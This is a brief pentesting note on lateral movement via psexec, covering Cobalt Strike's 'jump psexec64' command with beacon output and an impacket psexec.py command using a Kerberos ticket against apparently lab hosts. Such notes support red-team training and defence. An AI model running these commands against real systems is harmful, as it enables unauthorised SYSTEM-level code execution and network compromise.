## Description:  

For Lateral Movement in Cobalt Strike

TheÂ `psexec`Â /Â `psexec64`Â commands work by first uploading a service binary to the target system, then creating and starting a Windows service to execute that binary. Â `psexec_psh`Â doesn't copy a binary to the target, but instead executes a PowerShell one-liner (always 32-bit).

Beacons executed this way run as SYSTEM.

```
beacon> jump psexec64 srv-1 smb
Started service dd80980 on srv-1
[+] established link to child beacon: 10.10.17.25

```

### With impacket
You need a .ccache or .kirbi ticket.
To obtain those tickets from Rebeus: [[RubeusToCcache]]

```
export KRB5CCNAME=/root/impacket-examples/ticket.ccache
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```
